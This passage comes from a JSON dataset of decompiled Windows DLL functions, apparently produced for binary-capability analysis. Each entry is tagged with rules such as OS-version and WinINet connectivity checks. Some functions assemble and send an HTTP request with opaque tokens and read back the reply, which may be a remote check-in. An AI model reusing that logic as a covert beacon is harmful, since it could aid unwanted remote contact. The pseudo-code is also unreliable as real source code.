0xffffffffffffffff;\n                do {\n                    uVar6 = uVar6 + 1;\n                } while (*(arg2 + uVar6) != '\\0');\n            }\n            iVar2 = (**0x18012b078)(*0x18012a348, arg2, uVar6 & 0xffffffff, auStack2224);\n            if ((iVar2 != 0) && (iVar2 = (**0x18012b078)(*0x18012a348, arg3, arg4, auStack2224),  iVar2 != 0))\n            goto code_r0x00018006ad66;\n            uStack2296 = fcn.1800696f0();\n            pcVar7 = \"InternetWriteFile Failed\";\n        }\n    }\n    uStack2120 = 0;\n    auStack2216 = ZEXT816(0);\n    auStack2200 = ZEXT816(0);\n    auStack2184 = ZEXT816(0);\n    auStack2168 = ZEXT816(0);\n    auStack2152 = ZEXT816(0);\n    auStack2136 = ZEXT816(0);\n    fcn.180069580(auStack2216, 100, \"%s: %s\", pcVar7);\ncode_r0x00018006ad66:\n    fcn.18008fb00(var_bp_30h ^ auStack2328);\n    return;\n}\n",
        "token_count": 1884
    },
    "18006ad9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18006ad90(ulong noname_0, char *arg2, ulong arg3, int32_t *arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *arg4_00;\n    ulong var_17h;\n    uchar auStack248 [32];\n    ulong uStack216;\n    uint32_t uStack200;\n    int32_t iStack196;\n    uint32_t uStack192;\n    uint uStack188;\n    uchar auStack184 [16];\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [16];\n    uchar auStack120 [7];\n    ulong var_69h;\n    uchar auStack104 [3];\n    ulong var_5dh;\n    uint uStack88;\n    ulong var_49h;\n    uchar auStack72 [7];\n    ulong var_39h;\n    ulong var_29h;\n    ulong var_19h;\n    ulong var_9h;\n    \n    _auStack72 = *0x180123080 ^ auStack248;\n    iVar4 = 0;\n    uStack188 = 4;\n    iVar3 = 0;\n    uStack200 = 0;\n    iStack196 = 0;\n    if (*0x18012b068 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800fefd0);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b068 = (**0x1800de458)(iVar2);\n        if (*0x18012b068 == NULL) goto code_r0x00018006b0f9;\n    }\n    if (*0x18012b0a8 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800feff8);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b0a8 = (**0x1800de458)(iVar2);\n        if (*0x18012b0a8 == NULL) goto code_r0x00018006b0f9;\n    }\n    if (*0x18012b080 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800ff018);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b080 = (**0x1800de458)(iVar2);\n        if (*0x18012b080 == NULL) goto code_r0x00018006b0f9;\n    }\n    if (*0x18012b090 == NULL) {\n        iVar2 = (**0x1800de138)(\"WinInet\");\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b090 = (**0x1800de458)(iVar2);\n        if (*0x18012b090 == NULL) goto code_r0x00018006b0f9;\n    }\n    iVar1 = (**0x18012b068)(*0x18012a348, 0, 0, 0);\n    if (iVar1 == 0) {\n        uStack216 = fcn.1800696f0();\n        arg4_00 = \"HttpEndRequestA Failed\";\n    }\n    else {\n        uStack216 = 0;\n        iVar1 = (**0x18012b0a8)();\n        if (iVar1 == 0) {\n            uStack216 = fcn.1800696f0();\n            arg4_00 = \"HttpQueryInfoA Failed\";\n        }\n        else {\n            if (iStack196 - 200U < 100) {\n                iVar1 = (**0x18012b080)(*0x18012a348, &uStack200, 0, 0);\n                while ((iVar1 == 1 && (uStack200 != 0))) {\n                    if (arg3 - iVar3 < uStack200) goto code_r0x00018006b0f9;\n                    uStack192 = uStack200;\n                    iVar1 = (**0x18012b090)();\n                    if (iVar1 == 0) {\n                        uStack216 = fcn.1800696f0();\n                        arg4_00 = \"InternetReadFile Failed\";\n                        goto code_r0x00018006b0bf;\n                    }\n                    iVar3 = iVar3 + uStack192;\n                    iVar1 = (**0x18012b080)(*0x18012a348, &uStack200, 0, 0);\n                }\n                *arg4 = iVar3;\n                if (0 < iVar3) {\n                    do {\n                        if (*arg2 == '$') break;\n                        iVar4 = iVar4 + 1;\n                        arg2 = arg2 + 1;\n                    } while (iVar4 < iVar3);\n                }\n                goto code_r0x00018006b0f9;\n            }\n            uStack216 = fcn.1800696f0();\n            arg4_00 = \"Status Code Error\";\n        }\n    }\ncode_r0x00018006b0bf:\n    uStack88 = 0;\n    auStack184 = ZEXT816(0);\n    auStack168 = ZEXT816(0);\n    auStack152 = ZEXT816(0);\n    auStack136 = ZEXT816(0);\n    _auStack120 = ZEXT816(0);\n    _auStack104 = ZEXT816(0);\n    fcn.180069580(auStack184, 100, \"%s: %s\", arg4_00);\ncode_r0x00018006b0f9:\n    fcn.18008fb00(_auStack72 ^ auStack248);\n    return;\n}\n",
        "token_count": 1621
    },
    "18006b6e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18006b6e0(void)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint *puVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    uchar auStack2216 [32];\n    char *pcStack2184;\n    int64_t iStack2176;\n    int64_t iStack2168;\n    uint32_t uStack2152;\n    uint uStack2148;\n    uint uStack2144;\n    uint uStack2140;\n    uint uStack2136;\n    uint uStack2132;\n    uint uStack2128;\n    ushort uStack2124;\n    uchar auStack2120 [2096];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack2216;\n    fcn.1800ae290(auStack2120, 0, 0x824);\n    uStack2144 = *0x180101950;\n    uStack2140 = *0x180101954;\n    uStack2136 = *0x180101958;\n    uStack2132 = *0x18010195c;\n    uStack2148 = 0;\n    uStack2128 = 0x4a384335;\n    uStack2124 = 0x35;\n    uVar2 = fcn.1800b2838(0);\n    fcn.1800b62e0(uVar2);\n    iVar1 = fcn.1800b62b4(uVar2);\n    iStack2168 = (iVar1 % 10) * 0xc + 0x1800fdb10;\n    iVar1 = fcn.1800b62b4((iVar1 % 10) * 3);\n    iStack2176 = (iVar1 % 10) * 0xc + 0x1800fdc20;\n    iVar1 = fcn.1800b62b4(iVar1 % 10);\n    pcStack2184 = \"NKRRB\";\n    fcn.180069580(auStack2120, 0x824, \"%s=%s&%s=QQ34ES899WEET17BGSAAA&%s=\", \"idxAp\" + (iVar1 % 10) * 0xc);\n    iVar5 = -1;\n    do {\n        iVar8 = iVar5 + 1;\n        iVar4 = iVar5 + 1;\n        iVar5 = iVar8;\n    } while (str.KVWuPH1YYrhbBO:[iVar4] != '\\0');\n    iVar5 = -1;\n    do {\n        iVar3 = iVar5 + 1;\n        iVar4 = iVar5 + 1;\n        iVar5 = iVar3;\n    } while (*(&uStack2144 + iVar4) != '\\0');\n    iVar5 = -1;\n    do {\n        iVar7 = iVar5 + 1;\n        iVar4 = iVar5 + 1;\n        iVar5 = iVar7;\n    } while (\"NKRRB\"[iVar4] != '\\0');\n    uStack2152 = iVar3 + iVar7 + iVar8;\n    uVar2 = (**0x1800de418)(0x40, uStack2152 + 1);\n    pcStack2184 = str.KVWuPH1YYrhbBO:;\n    fcn.180069520(uVar2, \"%s%s%s\", &uStack2144, \"NKRRB\");\n    iVar4 = fcn.180065340(uVar2, &uStack2152);\n    iVar5 = iVar4;\n    iVar8 = fcn.180067260(iVar4, &uStack2152);\n    iVar1 = fcn.18006a9c0(iVar5, auStack2120, iVar8, uStack2152);\n    if (iVar1 == 0) {\n        if (iVar8 != 0) {\n            (**0x1800de0f8)(iVar8);\n        }\n        if (iVar4 != 0) {\n            (**0x1800de0f8)(iVar4);\n        }\n    }\n    else {\n        if (iVar8 != 0) {\n            (**0x1800de0f8)();\n        }\n        if (iVar4 != 0) {\n            (**0x1800de0f8)();\n        }\n        uVar2 = 0x40;\n        iVar5 = (**0x1800de418)();\n        if (iVar5 != 0) {\n            iVar1 = fcn.18006ad90(uVar2, iVar5, 0x20, &uStack2148);\n            if (iVar1 == 0) {\n                (**0x1800de0f8)();\n            }\n            else {\n                puVar6 = fcn.1800651b0(iVar5, &uStack2148);\n                iVar4 = -1;\n                do {\n                    iVar3 = iVar4 + 1;\n                    iVar8 = iVar4 + 1;\n                    iVar4 = iVar3;\n                } while (str.KVWuPH1YYrhbBO:[iVar8] != '\\0');\n                fcn.1800ade80(0x18012a358, str.KVWuPH1YYrhbBO:, iVar3);\n                *0x18012a368 = *puVar6;\n                *0x18012a36c = puVar6[1];\n                *0x18012a370 = puVar6[2];\n                *0x18012a374 = puVar6[3];\n                (**0x1800de0f8)(puVar6);\n                (**0x1800de0f8)(iVar5);\n            }\n        }\n    }\n    fcn.18008fb00(uStack24 ^ auStack2216);\n    return;\n}\n",
        "token_count": 1276
    },
    "18006bf6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18006bf60(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t arg2_00;\n    int64_t arg3_00;\n    uchar auStack600 [32];\n    uint uStack568;\n    ulong uStack560;\n    uchar auStack552 [528];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack600;\n    if ((arg2 != 0) && (arg2 == 1)) {\n        *0x1801247a0 = 0;\n        *0x180124798 = arg1;\n        *0x18012a388 = arg1;\n        (**0x1800de100)(arg1, auStack552, 0x104);\n        arg2_00 = (**0x1800de578)(auStack552);\n        arg3_00 = -1;\n        do {\n            arg3_00 = arg3_00 + 1;\n        } while (*(arg2_00 + arg3_00 * 2) != 0);\n        fcn.180010d70(0x1801247d0, arg2_00, arg3_00);\n        uStack560 = 0;\n        uStack568 = 0;\n        (**0x1800de420)(0, 0, 0x18006b9c0, arg3);\n    }\n    fcn.18008fb00(uStack24 ^ auStack600);\n    return;\n}\n",
        "token_count": 326
    },
    "18006cdb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18006cdb0(char param_1)\n\n{\n    int32_t iVar1;\n    int64_t arg3;\n    uchar auStack680 [32];\n    uint uStack648;\n    uint uStack640;\n    int64_t iStack632;\n    ulong uStack624;\n    uint uStack616;\n    uint uStack612;\n    ulong uStack608;\n    ulong uStack600;\n    ulong uStack592;\n    uchar auStack584 [16];\n    ulong uStack568;\n    int16_t aiStack552 [264];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack680;\n    if (param_1 != '\\0') {\n        iVar1 = (**0x1800de708)(*0x1801247a8);\n        if (iVar1 == 0) {\n            *0x1801247a0 = *0x18012a390;\n            auStack584 = ZEXT816(0);\n            uStack592 = 0;\n            if (*0x1801247a8 == 0) {\n                fcn.180066df0(0x180124790);\n                (**0x1800de5f0)(*0x1801247a8, aiStack552, 0x104);\n                arg3 = -1;\n                do {\n                    arg3 = arg3 + 1;\n                } while (aiStack552[arg3] != 0);\n                fcn.180010d70(0x1801247f0, aiStack552, arg3);\n                iStack632 = *0x1801247a8;\n                uStack568 = 0x1801247d0;\n                if (7 < *0x1801247e8) {\n                    uStack568 = *0x1801247d0;\n                }\n                uStack640 = 0x1020;\n                uStack624 = 0x1800ff3a8;\n                uStack600 = 0;\n                uStack612 = 0x10000009;\n                uStack616 = 0;\n                uStack648 = 0xe;\n                uStack608 = (**0x1800de608)(*0x18012a388, 0x2352, 1);\n                (**0x1800de7f0)(*0x18012a390, 0x809, 0, &iStack632);\n                fcn.1800544f0();\n            }\n        }\n    }\n    fcn.180054d50(0x180124790);\n    fcn.18008fb00(uStack24 ^ auStack680);\n    return;\n}\n",
        "token_count": 569
    },
    "18006dff": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid fcn.18006dff4(int64_t *arg1, ulong arg2, uint64_t arg3, char *arg4)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    uchar uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    uchar *puVar11;\n    uint64_t uVar12;\n    uint64_t uVar13;\n    uchar auStack168 [32];\n    char cStack136;\n    uint uStack132;\n    uint64_t uStack128;\n    ulong uStack120;\n    ulong uStack112;\n    uchar uStack104;\n    unkbyte7 Stack103;\n    uchar var_50h [4];\n    uint64_t var_4ch;\n    uint64_t var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    uStack112 = 0xfffffffffffffffe;\n    var_40h = *0x180123080 ^ auStack168;\n    if (*arg4 != '\\0') {\n        cVar3 = *arg4;\n        pcVar7 = arg4;\n        uVar9 = arg3;\n        do {\n            arg3 = uVar9 + 1;\n            if (cVar3 != *arg4) {\n                arg3 = uVar9;\n            }\n            pcVar7 = pcVar7 + 1;\n            cVar3 = *pcVar7;\n            uVar9 = arg3;\n        } while (cVar3 != '\\0');\n    }\n    _var_50h = 0;\n    stack0xffffffffffffffb0 = 0xf;\n    uStack104 = 0;\n    uStack120 = arg2;\n    if (arg3 < 0x10) {\n        _var_50h = arg3;\n        fcn.1800ae290(&uStack104, 0, arg3);\n        (&uStack104)[arg3] = 0;\n    }\n    else {\n        fcn.180014010(&uStack104, arg3);\n    }\n    uStack132 = 0xfffffffe;\n    uStack128 = 1;\n    puVar11 = CONCAT71(Stack103, uStack104);\n    uVar9 = stack0xffffffffffffffb0;\n    while( true ) {\n        cStack136 = '\\0';\n        iVar10 = 0;\n        uVar13 = 0;\n        uVar12 = uStack128;\n        if (arg3 == 0) break;\n        do {\n            for (; (arg4[iVar10] != '\\0' && (arg4[iVar10] != *arg4)); iVar10 = iVar10 + 1) {\n            }\n            puVar5 = &uStack104;\n            if (0xf < uVar9) {\n                puVar5 = puVar11;\n            }\n            if (puVar5[uVar13] == '\\0') {\n                iVar10 = iVar10 + uVar12;\n                if ((arg4[iVar10] == *arg4) || (arg4[iVar10] == '\\0')) {\n                    uStack132 = uVar13;\n                }\n                else {\n                    cVar3 = fcn.1800738b4(arg1, uStack120);\n                    uVar12 = uStack128;\n                    if (cVar3 == '\\0') {\n                        if (*(arg1 + 1) == '\\0') {\n                            iVar1 = *arg1;\n                            if (iVar1 == 0) {\ncode_r0x00018006e1ba:\n                                *arg1 = 0;\n                            }\n                            else {\n                                if (**(iVar1 + 0x38) == NULL) {\n                                    iVar8 = 0;\n                                }\n                                else {\n                                    iVar8 = **(iVar1 + 0x50);\n                                }\n                                if (iVar8 < 1) {\n                                    uVar4 = (**0x1800de8f0)();\n                                }\n                                else {\n                                    uVar4 = ***(iVar1 + 0x38);\n                                }\n                                if (uVar4 == 0xffffffff) goto code_r0x00018006e1ba;\n                                *(arg1 + 9) = uVar4;\n                            }\n                            *(arg1 + 1) = 1;\n                        }\n                        uVar12 = uStack128;\n                        if (arg4[iVar10] == *(arg1 + 9)) {\n                            cStack136 = '\\x01';\n                            goto code_r0x00018006e20c;\n                        }\n                    }\n                }\n                puVar5 = &uStack104;\n                if (0xf < uVar9) {\n                    puVar5 = puVar11;\n                }\n                uVar6 = 0x7f;\n                if (uVar12 < 0x7f) {\n                    uVar6 = uVar12;\n                }\n                puVar5[uVar13] = uVar6;\n                puVar11 = CONCAT71(Stack103, uStack104);\n                uVar9 = stack0xffffffffffffffb0;\n            }\n            else {\n                puVar5 = &uStack104;\n                if (0xf < uVar9) {\n                    puVar5 = puVar11;\n                }\n                iVar10 = iVar10 + puVar5[uVar13];\n            }\ncode_r0x00018006e20c:\n            uVar13 = uVar13 + 1;\n        } while (uVar13 < arg3);\n        if ((cStack136 == '\\0') || (cVar3 = fcn.1800738b4(arg1, uStack120),  cVar3 != '\\0')) break;\n        uStack128 = uStack128 + 1;\n        fcn.180071238(arg1);\n        uStack132 = 0xffffffff;\n    }\n    if (0xf < uVar9) {\n        puVar5 = puVar11;\n        if ((0xfff < uVar9 + 1) && (puVar5 = *(puVar11 + -8),  0x1f < puVar11 + (-8 - puVar5))) {\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18008fb24(puVar5);\n    }\n    fcn.18008fb00(var_40h ^ auStack168);\n    return;\n}\n",
        "token_count": 1485
    },
    "18006e7b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuchar * fcn.18006e7bc(uchar *arg1)\n\n{\n    int64_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    \n    uVar3 = in_EDX & 0xff;\n    iVar1 = *(arg1 + 8);\n    if (iVar1 != 0) {\n        if (**(iVar1 + 0x40) == 0) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = **(iVar1 + 0x58);\n        }\n        if (iVar4 < 1) {\n            uVar3 = (**0x1800de8f0)(iVar1, uVar3);\n        }\n        else {\n            **(iVar1 + 0x58) = **(iVar1 + 0x58) + -1;\n            puVar2 = **(iVar1 + 0x40);\n            **(iVar1 + 0x40) = puVar2 + 1;\n            *puVar2 = uVar3;\n        }\n        if (uVar3 != 0xffffffff) {\n            return arg1;\n        }\n    }\n    *arg1 = 1;\n    return arg1;\n}\n",
        "token_count": 279
    },
    "18006fd9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.18006fd9c(ulong noname_0, ushort *arg2, int64_t *arg3, char *arg4)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    char cVar3;\n    uint32_t uVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    uchar *puVar8;\n    ulong *puVar9;\n    char *pcVar10;\n    uint32_t uVar11;\n    uint64_t uVar12;\n    uchar *puVar13;\n    char *pcVar14;\n    int32_t iVar15;\n    char *pcVar16;\n    int64_t *piVar17;\n    int64_t *piVar18;\n    uint8_t *puVar19;\n    char *pcVar20;\n    ushort *puVar21;\n    int64_t *piVar22;\n    uint8_t uVar23;\n    uint8_t *puVar24;\n    uint32_t uVar25;\n    int32_t iVar26;\n    int64_t in_stack_00000028;\n    int32_t *in_stack_00000030;\n    uchar auStack544 [48];\n    char cStack496;\n    uint8_t uStack495;\n    char cStack494;\n    uint32_t uStack492;\n    char *pcStack488;\n    char *pcStack480;\n    uint8_t *puStack472;\n    uint64_t uStack464;\n    char *pcStack456;\n    ulong uStack448;\n    char cStack440;\n    uchar uStack439;\n    unkbyte6 Stack438;\n    uint64_t uStack424;\n    uint64_t uStack416;\n    uint8_t *puStack408;\n    int64_t iStack392;\n    char *pcStack384;\n    uint8_t auStack376 [22];\n    char cStack354;\n    char cStack353;\n    char cStack352;\n    char cStack351;\n    uchar auStack350 [6];\n    uint64_t uStack344;\n    char *pcStack336;\n    char *pcStack328;\n    uint64_t uStack320;\n    int64_t *piStack312;\n    int64_t *piStack304;\n    ushort *puStack296;\n    uchar *puStack288;\n    uchar auStack280 [8];\n    int64_t *piStack272;\n    uint32_t uStack240;\n    uint8_t uStack232;\n    uint8_t uStack231;\n    char cStack230;\n    uchar uStack229;\n    uint32_t uStack228;\n    uint32_t uStack224;\n    uint32_t uStack220;\n    char *pcStack216;\n    ulong uStack208;\n    char *pcStack200;\n    int64_t iStack192;\n    int32_t *piStack184;\n    ushort *puStack176;\n    ulong uStack168;\n    ushort uStack160;\n    unkbyte6 Stack158;\n    uint64_t uStack144;\n    uint64_t uStack136;\n    char *pcStack128;\n    int64_t iStack112;\n    uint64_t uStack104;\n    uint8_t auStack96 [17];\n    uchar auStack79 [5];\n    char cStack74;\n    char cStack73;\n    char cStack72;\n    char cStack71;\n    char cStack70;\n    char cStack69;\n    uchar auStack68 [4];\n    uint64_t uStack64;\n    \n    uStack168 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ &stack0xfffffffffffffee8;\n    piStack184 = in_stack_00000030;\n    iVar6 = *(*(in_stack_00000028 + 0x40) + 8);\n    puStack288 = 0x18006fe09;\n    pcStack216 = arg4;\n    iStack192 = iVar6;\n    puStack176 = arg2;\n    (**0x1800de8f0)(iVar6);\n    puStack288 = 0x18006fe13;\n    uVar5 = fcn.18006e658(&stack0xffffffffffffff38);\n    piStack272 = NULL;\n    uStack208 = uVar5;\n    if (iVar6 != 0) {\n        puStack288 = 0x18006fe33;\n        iVar6 = (**0x1800de8f0)(iVar6);\n        if (iVar6 != 0) {\n            puStack288 = 0x18006fe4f;\n            (**0x1800de8f0)(iVar6, 1);\n        }\n    }\n    puStack288 = 0x18006fe64;\n    (**0x1800de8f0)(uVar5, &stack0xffffffffffffff80);\n    iVar6 = *(*(in_stack_00000028 + 0x40) + 8);\n    puStack288 = 0x18006fe81;\n    iStack192 = iVar6;\n    (**0x1800de8f0)(iVar6);\n    puStack288 = 0x18006fe8b;\n    uVar7 = fcn.180012470(&stack0xffffffffffffff38);\n    if (iVar6 != 0) {\n        puStack288 = 0x18006fea3;\n        iVar6 = (**0x1800de8f0)(iVar6);\n        if (iVar6 != 0) {\n            puStack288 = 0x18006febf;\n            (**0x1800de8f0)(iVar6, 1);\n        }\n    }\n    puStack472 = &stack0xffffffffffffffa0;\n    piVar22 = 0x1800df7d5;\n    puStack288 = 0x18006fee1;\n    (**0x1800de8f0)(uVar7, 0x1800df7b8);\n    cStack230 = '\\0';\n    puStack288 = 0x18006fef4;\n    cVar2 = fcn.1800738b4(arg3, arg4);\n    if (cVar2 == '\\0') {\n        cVar2 = *(arg3 + 1);\n        if (cVar2 == '\\0') {\n            iVar6 = *arg3;\n            if (iVar6 == 0) {\ncode_r0x00018006ff43:\n                *arg3 = 0;\n            }\n            else {\n                piVar22 = **(iVar6 + 0x38);\n                piVar18 = piStack272;\n                if (piVar22 != NULL) {\n                    piVar18 = **(iVar6 + 0x50);\n                }\n                if (piVar18 < 1) {\n                    puStack288 = 0x18006ff39;\n                    uVar11 = (**0x1800de8f0)();\n                }\n                else {\n                    uVar11 = *piVar22;\n                }\n                if (uVar11 == 0xffffffff) goto code_r0x00018006ff43;\n                *(arg3 + 9) = uVar11;\n            }\n            *(arg3 + 1) = 1;\n            cVar2 = '\\x01';\n        }\n        cVar3 = *(arg3 + 9);\n        if (cVar3 == cStack73) {\n            *arg2 = 0x2b;\n        }\n        else {\n            if (cVar2 == '\\0') {\n                iVar6 = *arg3;\n                if (iVar6 == 0) {\ncode_r0x00018006ffa8:\n                    *arg3 = 0;\n                }\n                else {\n                    puStack472 = **(iVar6 + 0x38);\n                    piVar22 = piStack272;\n                    if (puStack472 != NULL) {\n                        piVar22 = **(iVar6 + 0x50);\n                    }\n                    if (piVar22 < 1) {\n                        puStack288 = 0x18006ff99;\n                        uVar11 = (**0x1800de8f0)();\n                        cVar3 = *(arg3 + 9);\n                    }\n                    else {\n                        uVar11 = *puStack472;\n                    }\n                    if (uVar11 == 0xffffffff) goto code_r0x00018006ffa8;\n                    cVar3 = uVar11;\n                    *(arg3 + 9) = cVar3;\n                }\n                *(arg3 + 1) = 1;\n            }\n            if (cVar3 != cStack74) goto code_r0x00018006ffc4;\n            *arg2 = 0x2d;\n        }\n        arg2 = arg2 + 1;\n        puStack288 = 0x18006ffc4;\n        fcn.180071238(arg3);\n    }\ncode_r0x00018006ffc4:\n    *arg2 = 0x7830;\n    puStack296 = arg2 + 1;\n    uStack232 = 0;\n    uStack224 = 0;\n    uStack228 = 0;\n    puStack288 = 0x18006ffec;\n    cVar2 = fcn.1800738b4(arg3, arg4);\n    if (cVar2 == '\\0') {\n        if (*(arg3 + 1) == '\\0') {\n            iVar6 = *arg3;\n            if (iVar6 == 0) {\ncode_r0x00018007003a:\n                *arg3 = 0;\n            }\n            else {\n                piVar22 = **(iVar6 + 0x38);\n                piVar18 = piStack272;\n                if (piVar22 != NULL) {\n                    piVar18 = **(iVar6 + 0x50);\n                }\n                if (piVar18 < 1) {\n                    puStack288 = 0x180070030;\n                    uVar11 = (**0x1800de8f0)();\n                }\n                else {\n                    uVar11 = *piVar22;\n                }\n                if (uVar11 == 0xffffffff) goto code_r0x00018007003a;\n                *(arg3 + 9) = uVar11;\n            }\n            *(arg3 + 1) = 1;\n        }\n        if (*(arg3 + 9) == auStack96[0]) {\n            puStack288 = 0x180070055;\n            fcn.180071238(arg3);\n            puStack288 = 0x180070060;\n            cVar2 = fcn.1800738b4(arg3, arg4);\n            if (cVar2 == '\\0') {\n                cVar2 = *(arg3 + 1);\n                if (cVar2 == '\\0') {\n                    iVar6 = *arg3;\n                    if (iVar6 == 0) {\ncode_r0x0001800700af:\n                        *arg3 = 0;\n                    }\n                    else {\n                        piVar22 = **(iVar6 + 0x38);\n                        piVar18 = piStack272;\n                        if (piVar22 != NULL) {\n                            piVar18 = **(iVar6 + 0x50);\n                        }\n                        if (piVar18 < 1) {\n                            puStack288 = 0x1800700a5;\n                            uVar11 = (**0x1800de8f0)();\n                        }\n                        else {\n                            uVar11 = *piVar22;\n                        }\n                        if (uVar11 == 0xffffffff) goto code_r0x0001800700af;\n                        *(arg3 + 9) = uVar11;\n                    }\n                    *(arg3 + 1) = 1;\n                    cVar2 = '\\x01';\n                }\n                cVar3 = *(arg3 + 9);\n                if (cVar3 != cStack71) {\n                    if (cVar2 == '\\0') {\n                        iVar6 = *arg3;\n                        if (iVar6 == 0) {\ncode_r0x00018007010e:\n                            *arg3 = 0;\n                        }\n                        else {\n                            puStack472 = **(iVar6 + 0x38);\n                            piVar22 = piStack272;\n                            if (puStack472 != NULL) {\n                                piVar22 = **(iVar6 + 0x50);\n                            }\n                            if (piVar22 < 1) {\n                                puStack288 = 0x1800700ff;\n                                uVar11 = (**0x1800de8f0)();\n                                cVar3 = *(arg3 + 9);\n                            }\n                            else {\n                                uVar11 = *puStack472;\n                            }\n                            if (uVar11 == 0xffffffff) goto code_r0x00018007010e;\n                            cVar3 = uVar11;\n                            *(arg3 + 9) = cVar3;\n                        }\n                        *(arg3 + 1) = 1;\n                    }\n                    if (cVar3 != cStack72) goto code_r0x000180070124;\n                }\n                puStack288 = 0x180070122;\n                fcn.180071238(arg3);\n            }\n            else {\ncode_r0x000180070124:\n                uStack232 = 1;\n            }\n        }\n    }\n    pcStack328 = pcStack216;\n    piStack312 = 0x24;\n    if (*piStack184 == 1000000000) {\n        piStack312 = 0x300;\n    }\n    uStack220 = piStack312;\n    pcVar16 = &stack0xffffffffffffff80;\n    if (0xf < uStack104) {\n        pcVar16 = pcStack128;\n    }\n    pcStack200 = pcVar16;\n    if (0x7d < *pcVar16 - 1U) {\n        puStack288 = 0x18007049a;\n        cVar2 = fcn.1800738b4(arg3, pcStack216);\n        piVar18 = piStack272;\n        uVar11 = uStack228;\n        while (cVar2 == '\\0') {\n            if (*(arg3 + 1) == '\\0') {\n                iVar6 = *arg3;\n                if (iVar6 == 0) {\ncode_r0x0001800704ea:\n                    *arg3 = 0;\n                }\n                else {\n                    if (**(iVar6 + 